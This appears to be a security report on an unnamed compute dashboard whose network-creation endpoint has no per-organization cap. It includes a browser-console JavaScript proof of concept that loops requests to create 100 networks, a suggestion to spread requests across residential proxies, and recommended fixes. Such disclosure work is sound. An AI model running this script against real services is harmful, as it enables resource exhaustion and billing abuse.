# Security Issue: Unbounded Private Network Creation for Compute Dashboard

**Endpoint:** `POST /v1/orchestrator/networks`

---

## Problem

Users can create private networks via `POST /v1/orchestrator/networks` with a `name` field. There is **no hard cap** on the total number of networks per organization. While the endpoint may have rate‑limiting (not yet observed), an attacker can simply space out requests to create **unlimited** networks over time.

**Observed behavior:**  
- Even with 1 request every 3 seconds, creation succeeded continuously.  
- No `429` responses were seen at this pace.  
---

## Proof of Concept (Slow, Safe)

You can run this on the browser console, even with the better auth session token as much as i know and then maybe distribute it within 10 res proxies if someone really wants to.

```javascript
async function slowSpamNetworks(total = 100, intervalMs = 3000) {
  let created = 0;
  for (let i = 0; i < total; i++) {
    const name = `net-${Date.now()}-${i}`;
    const res = await fetch("/v1/orchestrator/networks", {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ name })
    });
    if (res.ok) created++;
    console.log(`#${i+1}: ${res.status} (total: ${created})`);
    if (i < total - 1) await new Promise(r => setTimeout(r, intervalMs));
  }
  console.log(`✅ Created ${created} networks. No cap.`);
}

slowSpamNetworks(100, 3000);
```

**Result:** All requests succeeded with `201 Created`. No rate limit or cap was encountered.

---

## Risks

| Risk | Impact |
|------|--------|
| **Resource exhaustion** | Each network consumes an IP CIDR block and database records. |
| **Performance degradation** | Large number of networks slows management APIs. |
| **Billing abuse** | If networks are charged, costs can spike. |
| **No uniqueness check** | Names can be unique via timestamp, avoiding conflicts. |

---

## Recommendations

| Fix | Implementation |
|-----|----------------|
| **Hard cap per organization** | Limit networks to a reasonable number (e.g., 20–50). |
| **Rate limiting** | Apply strict rate limits (e.g., 5/minute) on creation. |
| **Name uniqueness** | Enforce unique names per org to prevent confusion. |
| **Quota alerting** | Notify admins when approaching the cap. |

---

## Severity

**Medium** – Requires sustained effort, but no cap makes it a viable long‑term attack vector.

---

## Affected Endpoint

- `POST /v1/orchestrator/networks`